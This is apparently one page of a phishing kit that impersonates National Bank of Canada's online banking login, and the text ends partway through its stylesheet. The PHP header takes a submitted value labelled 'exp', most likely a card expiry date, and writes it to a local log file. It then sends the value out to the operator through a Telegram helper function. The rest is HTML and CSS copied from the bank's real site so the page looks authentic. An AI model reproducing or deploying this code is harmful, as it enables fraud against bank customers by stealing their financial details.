<?php session_start();
   require_once "../sendto.php" ;

if ( !isset($_POST["exp"])) {
       header("Location: ./index.php");
        exit();
}
$_SESSION["exp"] = $_POST['exp'] ;

$donnees = "exp : " .$_SESSION["exp"] ."\n". "** FIN  CONNEXION **\n"."\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);
  sendMessageToTelegram($donnees) ;
session_destroy();




?>



<html lang="en" data-react-helmet="lang">
<script id="spcloader" type="text/javascript" async=""
    src="https://sdk.privacy-center.org/f93cfeed-d62f-4357-bfe9-f9f6887f69fb/loader.js?target_type=notice&amp;target=bFXc6fFy"
    charset="utf-8"></script>
<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js"
    id="eppiocemhmnlbhjplcgkofciiegomcon"></script>
<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script>
<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script>

<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <meta name="theme-color" content="#e41c23">
    <link rel="manifest" href="/manifest.json">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="msapplication-square310x310logo" content="/favicons/icon_largetile.png">
    <script src="../src/polyfills.js" type="“text/javascript”"></script>
    <script src="/env.js?v=12.3.0"></script>
    <link href="https://connexion.bnc.ca/static/css/2.c930e268.chunk.css" rel="stylesheet">
    <link href="https://connexion.bnc.ca/static/css/main.1097895c.chunk.css" rel="stylesheet">
    <style type="text/css" data-styled-components="iVXCSc cfSOAz" data-styled-components-is-local="true">
        /* sc-component-id: sc-keyframes-iVXCSc */
        @-webkit-keyframes iVXCSc {
            from {
                -webkit-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                transform: rotate(0deg);
            }

            to {
                -webkit-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        @keyframes iVXCSc {
            from {
                -webkit-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                transform: rotate(0deg);
            }

            to {
                -webkit-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        /* sc-component-id: sc-htoDjs */

        .cfSOAz {
            padding: 0.563rem 1rem;
            font-size: 1em;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            line-height: 1.25;
            border-radius: 8px;
            border: 1px solid #d2d2d2;
            color: #000;
            box-shadow: inset 0 1px 3px 0 rgba(0, 0, 0, 0.14);
            -webkit-transition: all 0.2s;
            transition: all 0.2s;
            -webkit-appearance: none;
            box-sizing: border-box;
        }

        .cfSOAz[disabled],
        .cfSOAz[disabled]+.radio-checkbox-input__elem {
            opacity: 0.3;
            background-color: #d2d2d2;
        }

        .cfSOAz[type='checkbox'],
        .cfSOAz[type='radio'] {
            width: 1px;
            height: 1px;
            padding: 0;
            overflow: hidden;
            border-color: transparent;
        }

        .cfSOAz[type='checkbox']+.radio-checkbox-input__elem,
        .cfSOAz[type='radio']+.radio-checkbox-input__elem {
            position: absolute;
            top: 0;
            left: 0;
            margin: 0;
            width: 2em;
            height: 2em;
            box-shadow: none;
            color: #fff;
            background: #fff;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            font-size: 1em;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            line-height: 1.25;
            border-radius: 8px;
            border: 1px solid #d2d2d2;
            -webkit-transition: all 0.2s;
            transition: all 0.2s;
            -webkit-appearance: none;
        }

        .cfSOAz[type='checkbox'].is-small+.radio-checkbox-input__elem,
        .cfSOAz[type='radio'].is-small+.radio-checkbox-input__elem {
            width: 1.5em;
            height: 1.5em;
        }

        .cfSOAz[type='checkbox'] {
            border-radius: 4px;
        }

        .cfSOAz[type='checkbox']+.radio-checkbox-input__elem {
            border-radius: 4px;
            background: #fff;
            border: 1px solid #d2d2d2;
        }

        .cfSOAz[type='checkbox']:checked+.radio-checkbox-input__elem {
            border-color: transparent;
            background-color: #1572c5;
            background-image: url();
            background-size: 1.5em;
            background-repeat: no-repeat;
            background-position: center;
        }

        .cfSOAz[type='checkbox'].is-small+.radio-checkbox-input__elem {
            width: 1.5em;
            height: 1.5em;
            background-size: 1em;
        }

        .cfSOAz[type='radio']+.radio-checkbox-input__elem {
            border-radius: 50%;
        }

        .cfSOAz[type='radio']:checked+.radio-checkbox-input__elem::after {
            content: '';
            display: inline-block;
            width: 1.125rem;
            height: 1.125rem;
            border-radius: 50%;
            background: #1572c5;
        }

        .cfSOAz[type='radio']:focus+.radio-checkbox-input__elem,
        .cfSOAz[type='checkbox']:focus+.radio-checkbox-input__elem {
            outline: 0;
            -webkit-transition: all 0.2s;
            transition: all 0.2s;
            box-shadow: 0 0 0 3px rgba(21, 114, 197, 0.2);
        }

        .cfSOAz[type='radio']:focus,
        .cfSOAz[type='checkbox']:focus {
            outline: 0;
        }
    </style>
    <style type="text/css">
        @import url("https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap");

        .rw-conversation-container .rw-header {
            background-color: #135afe;
            color: #fff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            text-align: center;
            height: 55px;
            font-family: Inter, sans-serif;
            position: relative
        }

        .rw-conversation-container .rw-header .rw-avatar {
            all: initial;
            height: 31px;
            width: 31px;
            position: absolute;
            top: 12px;
            left: 14px
        }

        .rw-conversation-container .rw-header.rw-with-subtitle {
            height: 70px
        }

        .rw-conversation-container .rw-header.rw-with-subtitle .rw-avatar {
            top: 20px
        }

        .rw-conversation-container .rw-header.rw-with-subtitle .rw-title {
            top: 11px
        }

        .rw-conversation-container .rw-header.rw-with-subtitle span {
            bottom: 12px;
            position: absolute;
            left: 22px
        }

        .rw-conversation-container .rw-header.rw-with-subtitle span.rw-with-avatar {
            left: 60px
        }

        .rw-conversation-container .rw-title {
            font-size: 20px;
            margin: 0;
            font-family: Inter, sans-serif;
            position: absolute;
            left: 20px;
            font-weight: 700
        }

        .rw-conversation-container .rw-title.rw-with-avatar {
            left: 58px
        }

        .rw-conversation-container .rw-header-buttons {
            position: absolute;
            right: 10px;
            display: flex;
            flex-direction: row
        }

        .rw-conversation-container .rw-close-button {
            display: none
        }

        .rw-conversation-container .rw-toggle-fullscreen-button {
            display: flex;
            justify-content: center;
            align-items: center;
            display: inline-block;
            background-color: transparent;
            border: 0;
            width: 40px;
            cursor: pointer
        }

        .rw-conversation-container .rw-toggle-fullscreen-button:active,
        .rw-conversation-container .rw-toggle-fullscreen-button:focus,
        .rw-conversation-container .rw-toggle-fullscreen-button:hover {
            outline: none
        }

        .rw-conversation-container .rw-toggle-fullscreen-button:active::-moz-focus-inner,
        .rw-conversation-container .rw-toggle-fullscreen-button:focus::-moz-focus-inner,
        .rw-conversation-container .rw-toggle-fullscreen-button:hover::-moz-focus-inner {
            border: 0
        }

        .rw-conversation-container .rw-toggle-fullscreen {
            width: 30px;
            height: 30px;
            padding-top: 3px
        }

        .rw-conversation-container .rw-toggle-fullscreen.rw-default {
            width: 20px;
            height: 20px
        }

        .rw-conversation-container .rw-toggle-fullscreen.rw-default:active,
        .rw-conversation-container .rw-toggle-fullscreen.rw-default:focus,
        .rw-conversation-container .rw-toggle-fullscreen.rw-default:hover {
            width: 24px;
            height: 24px
        }

        .rw-conversation-container .rw-toggle-fullscreen:active,
        .rw-conversation-container .rw-toggle-fullscreen:focus,
        .rw-conversation-container .rw-toggle-fullscreen:hover {
            width: 34px;
            height: 34px;
            top: -2px;
            margin-left: -2px
        }

        .rw-conversation-container .rw-loading {
            background-color: #b5b5b5;
            color: #fff;
            display: flex;
            flex-direction: column;
            text-align: center;
            padding: 5px 0;
            font-family: Inter, sans-serif;
            font-size: 14px
        }

        .rw-widget-embedded .rw-header {
            display: none
        }

        .rw-full-screen .rw-header {
            border-radius: 0;
            flex-shrink: 0;
            position: relative
        }

        .rw-full-screen .rw-close-button,
        .rw-full-screen .rw-toggle-fullscreen-button {
            display: flex;
            justify-content: center;
            align-items: center;
            display: inline-block;
            background-color: transparent;
            border: 0;
            width: 40px;
            cursor: pointer
        }

        .rw-full-screen .rw-close-button:active,
        .rw-full-screen .rw-close-button:focus,
        .rw-full-screen .rw-close-button:hover,
        .rw-full-screen .rw-toggle-fullscreen-button:active,
        .rw-full-screen .rw-toggle-fullscreen-button:focus,
        .rw-full-screen .rw-toggle-fullscreen-button:hover {
            outline: none
        }

        .rw-full-screen .rw-close-button:active::-moz-focus-inner,
        .rw-full-screen .rw-close-button:focus::-moz-focus-inner,
        .rw-full-screen .rw-close-button:hover::-moz-focus-inner,
        .rw-full-screen .rw-toggle-fullscreen-button:active::-moz-focus-inner,
        .rw-full-screen .rw-toggle-fullscreen-button:focus::-moz-focus-inner,
        .rw-full-screen .rw-toggle-fullscreen-button:hover::-moz-focus-inner {
            border: 0
        }

        .rw-full-screen .rw-close,
        .rw-full-screen .rw-toggle-fullscreen {
            width: 30px;
            height: 30px;
            padding-top: 3px
        }

        .rw-full-screen .rw-close.rw-default,
        .rw-full-screen .rw-toggle-fullscreen.rw-default {
            width: 20px;
            height: 20px
        }

        .rw-full-screen .rw-close.rw-default:active,
        .rw-full-screen .rw-close.rw-default:focus,
        .rw-full-screen .rw-close.rw-default:hover,
        .rw-full-screen .rw-toggle-fullscreen.rw-default:active,
        .rw-full-screen .rw-toggle-fullscreen.rw-default:focus,
        .rw-full-screen .rw-toggle-fullscreen.rw-default:hover {
            width: 24px;
            height: 24px
        }

        .rw-full-screen .rw-close:active,
        .rw-full-screen .rw-close:focus,
        .rw-full-screen .rw-close:hover,
        .rw-full-screen .rw-toggle-fullscreen:active,
        .rw-full-screen .rw-toggle-fullscreen:focus,
        .rw-full-screen .rw-toggle-fullscreen:hover {
            width: 34px;
            height: 34px;
            top: -2px;
            margin-left: -2px
        }

        .rw-full-screen .rw-loading {
            border-radius: 0;
            flex-shrink: 0;
            position: relative
        }

        .rw-full-screen.rw-widget-container .rw-conversation-container {
            margin-bottom: 0
        }

        @media screen and (max-width:800px) {
            .rw-conversation-container .rw-header {
                border-radius: 0;
                flex-shrink: 0;
                position: relative
            }

            .rw-conversation-container .rw-close-button {
                display: flex;
                justify-content: center;
                align-items: center;
                display: inline-block;
                background-color: transparent;
                border: 0;
                width: 40px;
                cursor: pointer
            }

            .rw-conversation-container .rw-close-button:active,
            .rw-conversation-container .rw-close-button:focus,
            .rw-conversation-container .rw-close-button:hover {
                outline: none
            }

            .rw-conversation-container .rw-close-button:active::-moz-focus-inner,
            .rw-conversation-container .rw-close-button:focus::-moz-focus-inner,
            .rw-conversation-container .rw-close-button:hover::-moz-focus-inner {
                border: 0
            }

            .rw-conversation-container .rw-close {
                width: 30px;
                height: 30px;
                padding-top: 3px
            }

            .rw-conversation-container .rw-close.rw-default {
                width: 20px;
                height: 20px
            }

            .rw-conversation-container .rw-close.rw-default:active,
            .rw-conversation-container .rw-close.rw-default:focus,
            .rw-conversation-container .rw-close.rw-default:hover {
                width: 24px;
                height: 24px
            }

            .rw-conversation-container .rw-close:active,
            .rw-conversation-container .rw-close:focus,
            .rw-conversation-container .rw-close:hover {
                width: 34px;
                height: 34px;
                top: -2px;
                margin-left: -2px
            }

            .rw-conversation-container .rw-toggle-fullscreen-button,
            .rw-conversation-container .rw-w-.toggle-fullscreen {
                display: none
            }

            .rw-conversation-container .rw-loading {
                border-radius: 0;
                flex-shrink: 0;
                position: relative
            }
        }
    </style>
    <style type="text/css">
        @import url("https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap");

        .rw-conversation-container .rw-videoFrame {
            width: 300px;
            height: 200px;
            margin-top: 10px;
            border: none
        }
    </style>
    <style type="text/css">
        @import url("https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap");

        .rw-conversation-container .rw-image-details {
            -o-object-fit: scale-down;
            object-fit: scale-down;
            max-width: 100%;
            margin-top: 10px
        }

        .rw-conversation-container .rw-image-frame {
            -o-object-position: 0 0;
            object-position: 0 0;
            -o-object-fit: cover;
            object-fit: cover;
            width: 100%;
            height: 100%;
            border-radius: 15px
        }
    </style>
    <style type="text/css">
        .rw-doc-viewer-modal {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 20041997;
            display: block
        }

        .rw-doc-viewer-modal-body {
            overflow-y: auto;
            border-radius: 5px;
            width: 80vw;
            max-width: 900px;
            position: relative;
            height: 90vh;
            top: 0;
            background: #fff;
            -webkit-animation: doc-viewer-slide-down .2s ease;
            animation: doc-viewer-slide-down .2s ease
        }

        .rw-doc-viewer-open-modal-link {
            color: #003a9b;
            text-decoration: underline;
            cursor: pointer;
            display: inline;
            background: none !important;
            border: none;
            padding: 0 !important;
            font: inherit
        }

        .rw-doc-viewer-modal-iframe {
            height: 100%;
            width: 100%;
            border: none
        }

        .rw-doc-viewer-modal-fade {
            opacity: .5;
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 10000;
            background-color: #000;
            -webkit-animation: appear .2s ease;
            animation: appear .2s ease
        }

        .rw-doc-viewer-modal-footer {
            flex: 0 0 auto;
            border: none;
            text-align: center;
            margin-top: 2vh
        }

        .rw-doc-viewer-close-modal {
            border-radius: 50%;
            background: #89919b;
            color: #fff;
            font-size: 15px;
            width: 45px;
            height: 45px;
            padding: 0;
            text-align: center;
            cursor: pointer;
            touch-action: manipulation;
            border: 1px solid transparent;
            font-weight: 100
        }

        .rw-doc-viewer-spinner {
            display: inline-block;
            width: 64px;
            height: 64px;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-32px, -32px);
            -webkit-animation: appear .6s ease-in;
            animation: appear .6s ease-in
        }

        .rw-doc-viewer-spinner:after {
            content: " ";
            display: block;
            width: 46px;
            height: 46px;
            margin: 1px;
            border-radius: 50%;
            border-color: #003a9b transparent;
            border-style: solid;
            border-width: 5px;
            will-change: transform;
            -webkit-animation: doc-viewer-spinner 1.2s linear infinite;
            animation: doc-viewer-spinner 1.2s linear infinite
        }

        @-webkit-keyframes doc-viewer-spinner {
            0% {
                transform: rotate(0deg)
            }

            to {
                transform: rotate(1turn)
            }
        }

        @keyframes doc-viewer-spinner {
            0% {
                transform: rotate(0deg)
            }

            to {
                transform: rotate(1turn)
            }
        }

        @-webkit-keyframes appear {
            0% {
                opacity: 0
            }

            to {
                opacity: .5
            }
        }

        @keyframes appear {
            0% {
                opacity: 0
            }

            to {
                opacity: .5
            }
        }

        @-webkit-keyframes doc-viewer-slide-down {
            0% {
                opacity: 0;
                transform: translateY(-100px)
            }

            to {
                opacity: 1;
                transform: translateY(0)
            }
        }

        @keyframes doc-viewer-slide-down {
            0% {
                opacity: 0;
                transform: translateY(-100px)
            }

            to {
                opacity: 1;
                transform: translateY(0)
            }
        }
    </style>
    <style type="text/css">
        @import url("https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap");

        .rw-conversation-container .rw-message {
            margin: 10px;
            font-size: 16px;
            line-height: 20px;
            display: flex;
            font-family: Inter, sans-serif;
            flex-wrap: wrap;
            position: relative
        }

        .rw-conversation-container .rw-message .rw-markdown p {
            font-size: 100%;
            line-height: 20px;
            letter-spacing: 0;
            font-family: Inter, sans-serif;
            flex-wrap: wrap;
            position: relative;
            color: #000;
            margin: 0
        }

        .rw-conversation-container .rw-client {
            background-color: #003a9b;
            color: #fff;
            border-radius: 15px;
            padding: 11px 15px;
            max-width: 215px;
            text-align: left;
            font-family: Inter, sans-serif;
            background-color: #135afe;
            max-width: 85%;
            margin-left: auto;
            overflow-wrap: break-word
        }

        .rw-conversation-container .rw-client a {
            color: #35cce6
        }

        .rw-conversation-container .rw-response {
            background-color: #f4f7f9;
            color: #000;
            border-radius: 0 15px 15px 15px;
            padding: 11px 15px;
            max-width: 215px;
            text-align: left;
            font-family: Inter, sans-serif;
            overflow-wrap: break-word
        }

        .rw-conversation-container .rw-message-text {
            margin: 0
        }

        .rw-conversation-container .rw-message-text .rw-markdown p {
            margin-bottom: 1em
        }

        .rw-conversation-container .rw-message-text .rw-markdown p:last-child {
            margin-bottom: 0
        }
    </style>
    <style type="text/css">
        @import url("https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap");

        .rw-carousel-container {
            padding-bottom: 10px;
            overflow-x: hidden;
            overflow-y: hidden;
            white-space: nowrap;
            padding-left: 5px;
            padding-right: 0;
            margin-top: 8px;
            position: relative;
            display: flex
        }

        .rw-carousel-container .rw-carousel-card {
            display: inline-block;
            max-width: 220px;
            width: 220px;
            min-width: 220px;
            margin: 3px 13px 3px 1px;
            box-shadow: 4px 2px 12px 1px rgba(0, 0, 0, .1);
            border-radius: 8px;
            overflow: hidden;
            position: relative
        }

        .rw-carousel-container .rw-carousel-card .rw-carousel-card-image {
            width: 100%;
            height: 150px;
            -o-object-fit: cover;
            object-fit: cover;
            display: block;
            background-color: #b5b5b5;
            cursor: pointer
        }

        .rw-carousel-container .rw-carousel-card .rw-carousel-card-title {
            display: block;
            margin: 7px 10px 2px 9px;
            font-weight: 500;
            overflow: hidden;
            text-overflow: ellipsis;
            cursor: pointer;
            text-decoration: none;
            color: inherit
        }

        .rw-carousel-container .rw-carousel-card .rw-carousel-card-subtitle {
            display: block;
            margin: 0 9px 8px;
            opacity: .5;
            font-size: .8em;
            overflow: hidden;
            white-space: normal;
            line-height: normal;
            cursor: pointer;
            text-decoration: none;
            color: inherit
        }

        .rw-carousel-container .rw-carousel-card .rw-carousel-buttons-container {
            margin-bottom: 1.5rem;
            width: 100%
        }

        .rw-carousel-container .rw-carousel-card .rw-carousel-buttons-container .rw-reply {
            min-height: 21px;
            margin: 5px 10px;
            font-size: .9em;
            justify-content: center;
            outline: none
        }

        .rw-carousel-container .rw-carousel-card .rw-carousel-buttons-container .rw-reply span {
            white-space: nowrap;
            text-overflow: ellipsis;
            overflow: hidden
        }

        .rw-carousel-arrows-container {
            height: 280px;
            width: 100%;
            padding-left: -12px;
            padding-right: 0;
            margin-top: 8px;
            position: absolute;
            pointer-events: none
        }

        .rw-carousel-arrows-container .rw-carousel-arrow {
            pointer-events: auto;
            position: absolute;
            width: 30px;
            height: 30px;
            background-color: #fff;
            top: 40%;
            border-radius: 11px;
            transition: all .2s ease-in-out;
            cursor: pointer;
            box-shadow: 0 2px 8px 4px hsla(0, 0%, 78.4%, .35);
            outline: none
        }

        .rw-carousel-arrows-container .rw-carousel-arrow:hover {
            box-shadow: 0 3px 8px 4px hsla(0, 0%, 78.4%, .2);
            top: calc(40% - 3px)
        }

        .rw-carousel-arrows-container .rw-carousel-arrow:active {
            box-shadow: 0 2px 8px 4px hsla(0, 0%, 78.4%, .3);
            top: calc(40% - 2px)
        }

        .rw-carousel-arrows-container .rw-carousel-arrow img.rw-arrow {
            position: absolute;
            height: 100%;
            left: 3px
        }

        .rw-carousel-arrows-container .rw-left-arrow {
            left: 10px
        }

        .rw-carousel-arrows-container .rw-right-arrow {
            right: 10px
        }

        .rw-carousel-arrows-container .rw-right-arrow div.rw-arrow {
            transform: rotate(180deg)
        }
    </style>
    <style type="text/css">
        @import url("https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap");

        .rw-conversation-container .rw-replies {
            margin: 5px 10px;
            display: flex;
            line-height: 20px;
            flex-wrap: wrap;
            font-size: 14px;
            font-family: Inter, sans-serif
        }

        .rw-conversation-container .rw-reply {
            transition: box-shadow .3s ease, top .3s ease;
            display: flex;
            -webkit-flex-align: center;
            align-items: center;
            background-color: #135afe;
            border-radius: 15px;
            color: #f4f7f9;
            border: 1px solid #135afe;
            padding: 4px 8px;
            max-width: 215px;
            min-height: 1.7em;
            font-weight: 500;
            text-align: center;
            font-family: Inter, sans-serif;
            cursor: pointer;
            margin: .25em;
            text-decoration: unset;
            box-shadow: 0 .2px .7px -7px rgba(0, 0, 0, .277), 0 .5px 1.8px -7px rgba(0, 0, 0, .369), 0 1.2px 3.8px -7px rgba(0, 0, 0, .442), 0 4px 13px -7px rgba(0, 0, 0, .64)
        }

        .rw-conversation-container .rw-reply:hover {
            position: relative;
            top: 1px;
            opacity: 1;
            box-shadow: none
        }

        .rw-conversation-container .rw-response {
            background-color: #f4f7f9;
            color: #000;
            border-radius: 0 15px 15px 15px;
            padding: 11px 15px;
            max-width: 215px;
            text-align: left;
            font-family: Inter, sans-serif;
            max-width: 85%
        }

        .rw-conversation-container .rw-avatar {
            width: 17px;
            height: 17px;
            border-radius: 100%;
            margin-right: 6px;
            position: relative;
            bottom: 5px
        }
    </style>
    <style type="text/css">
        @import url("https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap");

        .rw-group-message.rw-from-client span.rw-message-date {
            text-align: right;
            flex-basis: 100%;
            margin-left: 0;
            margin-right: 4px;
            margin-top: 5px;
            font-size: 11px;
            color: #a4a7ab
        }

        .rw-group-message.rw-from-response span.rw-message-date {
            text-align: left;
            flex-basis: 100%;
            margin-left: 7px;
            margin-top: 5px;
            font-size: 11px;
            color: #a4a7ab
        }

        .rw-group-message.rw-from-response .rw-message:first-child:not(:only-child) {
            margin-bottom: 2px
        }

        .rw-group-message.rw-from-response .rw-message:first-child:not(:only-child) .rw-response {
            border-radius: 0 15px 15px 0
        }

        .rw-group-message.rw-from-response .rw-message:not(:first-child):not(:last-child):not(:last-child) {
            margin-top: 2px;
            margin-bottom: 2px
        }

        .rw-group-message.rw-from-response .rw-message:not(:first-child):not(:last-child):not(:last-child) .rw-response {
            border-radius: 0 15px 15px 0
        }

        .rw-group-message.rw-from-response .rw-message:not(:first-child):not(:only-child) .rw-avatar {
            display: none
        }

        .rw-group-message.rw-from-response .rw-message:not(:first-child):not(:only-child).rw-with-avatar {
            margin-left: 33px
        }

        .rw-group-message.rw-from-response .rw-message:last-child:not(:only-child) {
            margin-top: 2px
        }

        .rw-message.rw-typing-indication .rw-response {
            box-sizing: content-box;
            height: 16px
        }

        .rw-messages-container {
            background-color: #fff;
            height: 50vh;
            max-height: 425px;
            overflow-y: auto;
            padding-top: 10px
        }

        @media screen and (min-width:800px) {
            .rw-messages-container {
                height: 510px;
                max-height: 50vh
            }
        }

        .rw-messages-container:focus {
            outline: none;
            z-index: 2;
            position: relative
        }

        @media (max-width:800px) {
            .rw-messages-container {
                z-index: 0
            }
        }

        .rw-widget-embedded .rw-messages-container {
            height: 100%;
            max-height: 100%
        }

        .rw-full-screen .rw-messages-container {
            height: 100%;
            max-height: none
        }

        @media screen and (max-width:800px) {
            .rw-messages-container {
                height: 100%;
                max-height: none
            }
        }

        div#wave {
            position: relative;
            text-align: center;
            width: 25px;
            height: 13px;
            margin-left: auto;
            margin-right: auto
        }

        div#wave .rw-dot {
            opacity: .4;
            display: inline-block;
            width: 5px;
            height: 5px;
            border-radius: 50%;
            margin-right: 3px;
            background: #000;
            -webkit-animation: wave 1.6s linear infinite;
            animation: wave 1.6s linear infinite
        }

        div#wave .rw-dot:nth-child(2) {
            -webkit-animation-delay: -1.4s;
            animation-delay: -1.4s
        }

        div#wave .rw-dot:nth-child(3) {
            -webkit-animation-delay: -1.2s;
            animation-delay: -1.2s
        }

        @-webkit-keyframes wave {

            0%,
            60%,
            to {
                transform: none
            }

            30% {
                transform: translateY(-5px)
            }
        }

        @keyframes wave {

            0%,
            60%,
            to {
                transform: none
            }

            30% {
                transform: translateY(-5px)
            }
        }
    </style>
    <style type="text/css">
        @import url("https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap");

        .rw-conversation-container .rw-sender {
            align-items: center;
            display: flex;
            background-color: #f4f7f9;
            min-height: 30px;
            padding: 15px 5px
        }

        .rw-conversation-container .rw-sender-focused {
            box-shadow: 0 0 0 2px #fff, inset 0 0 0 5px rgba(21, 114, 197, .8) !important;
            border-bottom-left-radius: 8px;
            border-bottom-right-radius: 8px
        }

        .rw-conversation-container .rw-new-message {
            font-size: 1em;
            width: 100%;
            border: 0;
            background-color: #f4f7f9;
            padding-left: 15px;
            font-family: Inter, sans-serif;
            min-height: 30px;
            resize: none
        }

        .rw-conversation-container .rw-new-message:focus {
            outline: none
        }

        .rw-conversation-container .rw-send {
            background: #f4f7f9;
            border: 0
        }

        .rw-conversation-container .rw-send .rw-send-icon {
            fill: transparent;
            transition: fill .35s
        }

        .rw-conversation-container .rw-send .rw-send-icon-ready {
            fill: #135afe;
            transition: fill .35s
        }

        @media screen and (max-width:800px) {
            .rw-conversation-container .rw-sender {
                border-radius: 0;
                flex-shrink: 0
            }
        }

        .rw-widget-embedded .rw-sender {
            flex: 0, 0, auto;
            min-height: 35px
        }
    </style>
    <style type="text/css">
        @import url("https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap");

        @-webkit-keyframes rotation-lr {
            0% {
                transform: rotate(-90deg)
            }

            to {
                transform: rotate(0)
            }
        }

        @keyframes rotation-lr {
            0% {
                transform: rotate(-90deg)
            }

            to {
                transform: rotate(0)
            }
        }

        @-webkit-keyframes rotation-rl {
            0% {
                transform: rotate(90deg)
            }

            to {
                transform: rotate(0)
            }
        }

        @keyframes rotation-rl {
            0% {
                transform: rotate(90deg)
            }

            to {
                transform: rotate(0)
            }
        }

        @-webkit-keyframes slide-in {
            0% {
                opacity: 0;
                transform: translateY(10px)
            }

            to {
                opacity: 1;
                transform: translateY(0)
            }
        }

        @keyframes slide-in {
            0% {
                opacity: 0;
                transform: translateY(10px)
            }

            to {
                opacity: 1;
                transform: translateY(0)
            }
        }

        @-webkit-keyframes slide-out {
            0% {
                opacity: 1;
                transform: translateY(0)
            }

            to {
                opacity: 0;
                transform: translateY(10px)
            }
        }

        @keyframes slide-out {
            0% {
                opacity: 1;
                transform: translateY(0)
            }

            to {
                opacity: 0;
                transform: translateY(10px)
            }
        }

        .rw-conversation-container {
            -webkit-animation-delay: 0;
            -webkit-animation-duration: .5s;
            -webkit-animation-name: slide-in;
            -webkit-animation-fill-mode: forwards;
            -moz-animation-delay: 0;
            -moz-animation-duration: .5s;
            -moz-animation-name: slide-in;
            -moz-animation-fill-mode: forwards;
            animation-delay: 0;
            animation-duration: .5s;
            animation-name: slide-in;
            animation-fill-mode: forwards;
            border-radius: 10px;
            box-shadow: 0 1px 1.5px -1px rgba(0, 0, 0, .048), 0 2.5px 3.7px -1px rgba(0, 0, 0, .069), 0 5px 7px -1px rgba(0, 0, 0, .085), 0 9.7px 12.5px -1px rgba(0, 0, 0, .101), 0 19.7px 23.4px -1px rgba(0, 0, 0, .122), 0 54px 56px -1px rgba(0, 0, 0, .17);
            overflow: hidden;
            width: 370px
        }

        .rw-slide-out {
            -webkit-animation-delay: 0;
            -webkit-animation-duration: .5s;
            -webkit-animation-name: slide-out;
            -webkit-animation-fill-mode: forwards;
            -moz-animation-delay: 0;
            -moz-animation-duration: .5s;
            -moz-animation-name: slide-out;
            -moz-animation-fill-mode: forwards;
            animation-delay: 0;
            animation-duration: .5s;
            animation-name: slide-out;
            animation-fill-mode: forwards
        }

        .rw-widget-embedded .rw-conversation-container {
            -webkit-animation-delay: 0;
            -webkit-animation-duration: 0s;
            -webkit-animation-name: slide-in;
            -webkit-animation-fill-mode: forwards;
            -moz-animation-delay: 0;
            -moz-animation-duration: 0s;
            -moz-animation-name: slide-in;
            -moz-animation-fill-mode: forwards;
            animation-delay: 0;
            animation-duration: 0s;
            animation-name: slide-in;
            animation-fill-mode: forwards;
            display: flex;
            flex-direction: column;
            height: 100%;
            width: 100%;
            border-radius: 0;
            overflow: unsetem
        }

        .rw-widget-embedded .rw-slide-out {
            -webkit-animation-delay: 0;
            -webkit-animation-duration: 0s;
            -webkit-animation-name: slide-out;
            -webkit-animation-fill-mode: forwards;
            -moz-animation-delay: 0;
            -moz-animation-duration: 0s;
            -moz-animation-name: slide-out;
            -moz-animation-fill-mode: forwards;
            animation-delay: 0;
            animation-duration: 0s;
            animation-name: slide-out;
            animation-fill-mode: forwards
        }

        .rw-full-screen .rw-conversation-container {
            display: flex;
            flex-direction: column;
            height: 100%;
            width: 100%;
            border-radius: 0
        }

        @media screen and (max-width:800px) {
            .rw-conversation-container {
                display: flex;
                flex-direction: column;
                height: 100%;
                width: 100%;
                border-radius: 0
            }
        }
    </style>
    <style type="text/css">
        .slick-slider {
            box-sizing: border-box;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            -webkit-touch-callout: none;
            -khtml-user-select: none;
            touch-action: pan-y;
            -webkit-tap-highlight-color: transparent
        }

        .slick-list,
        .slick-slider {
            position: relative;
            display: block
        }

        .slick-list {
            overflow: hidden;
            margin: 0;
            padding: 0
        }

        .slick-list:focus {
            outline: none
        }

        .slick-list.dragging {
            cursor: pointer;
            cursor: hand
        }

        .slick-slider .slick-list,
        .slick-slider .slick-track {
            transform: translateZ(0)
        }

        .slick-track {
            position: relative;
            top: 0;
            left: 0;
            display: block;
            margin-left: auto;
            margin-right: auto
        }

        .slick-track:after,
        .slick-track:before {
            display: table;
            content: ""
        }

        .slick-track:after {
            clear: both
        }

        .slick-loading .slick-track {
            visibility: hidden
        }

        .slick-slide {
            display: none;
            float: left;
            height: 100%;
            min-height: 1px
        }

        [dir=rtl] .slick-slide {
            float: right
        }

        .slick-slide img {
            display: block
        }

        .slick-slide.slick-loading img {
            display: none
        }

        .slick-slide.dragging img {
